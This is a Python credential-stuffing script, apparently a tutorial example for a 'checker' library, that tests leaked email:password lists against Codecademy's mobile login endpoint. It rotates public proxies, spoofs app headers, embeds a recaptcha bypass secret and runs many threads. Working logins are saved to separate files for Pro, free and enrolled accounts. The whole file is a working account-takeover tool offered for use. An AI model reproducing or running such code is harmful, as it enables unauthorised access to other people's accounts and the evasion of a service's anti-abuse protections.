from keker import *
import requests



Main.title("CodecAdemy Checker")
# Program title set to CodecAdemy Checker

proxy, combo = [], []
Combo(combo).from_file(Main.input.combo()) 
# Geting a combolist from a file and using input class to input a combo path from user

Combo.remove(combo).duplicates
# Removing duplicates from combolist

Proxy(proxy).from_api("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all")
# Geting a Proxies from an API ( You can get combo and proxy from api/file )

proxy_type = Main.input.proxy_type()
# Geting the proxy type from input class

threads_value = Main.input.threads(' [Input] How many THREADS: ')
# Geting the threads value from input class ( And as you can see you can change the input msg )

Main.clear()
# Clear the console!

# Making the checker body..
retry, good, bad, pro, stuffed, free = 0, 0, 0, 0, 0, 0

def sort(fileName: str, json, data):
    Main.save(fileName, str(data)+" | Pro: "+str(json['is_pro'])+" | Courses: "+str(len(json['course_enrollments']))+" | Paths: "+str(len(json['path_enrollments']))+"\n")
    # Using save method from Main class to save the good accounts
    # save method auto make results file and on the results file making date file and saving on it

def check():
    global retry, good, bad, pro, stuffed, free, combo, proxy
    while 1:
        ep =  Combo.pop(combo.pop(0))
        # pop method to get a pop value from the combo
        # Its poping the value from the list so its no loger on it

        # It's also check if its a valid is value or not
        # That's why in line 47 we check if it's False

        if not ep: continue
        else:
            email = str(ep[0])
            password = str(ep[1])
            try:
                response = requests.post('https://www.codecademy.com/login.json', 
                    headers={
                    'Host': 'www.codecademy.com', 'Content-Type': 'application/json',
                    'Accept': '*/*', 'cc-user-agent': 'cc-mobile-app v1.14.0',
                    'Connection': 'keep-alive', 'Accept-Language': 'en-us',
                    'User-Agent': 'Codecademy%20Go/2 CFNetwork/1331.0.7 Darwin/21.4.0'}, 
                    json={'user': {'login': str(email),'password': str(password),},'mobile-recaptcha-secret': 'XCL9eznoqYa4aWLiQQzs'},

                    proxies=Proxy.proxies(proxy_type, Proxy(proxy).random), timeout=15)
                    # Using (proxies, random) method from Proxy class to send it

                if 'Ray ID' in response.text: retry += 1;combo.append(f'{email}:{password}')
                elif 'Invalid Login or password.' in response.text: bad += 1
                elif 'auth_token' in response.text:
                    good += 1
                    json = response.json()
                    if json['is_pro']: pro += 1;sort('Pro.txt', json, f'{email}:{password}')
                    elif not json['path_enrollments'] and not json['course_enrollments']: free += 1;sort('Free.txt', json, f'{email}:{password}')
                    else: stuffed += 1;sort('Stuffed.txt', json, f'{email}:{password}')
                else:  retry += 1
            
            except IndexError: break
            except: retry += 1;combo.append(f'{email}:{password}')

        Main.title(f"CodecAdemy Made By: @Tufaah -- ( Good: {good} -- Bad: {bad} -- Retry: {retry} )")
        # Using title method to title the stats


print(' Checking...')
Main.multi_threading(threads_value, target=check)
# Using multi_threading method to multi thrading a task
# It takes ( threads_value, and the target function )
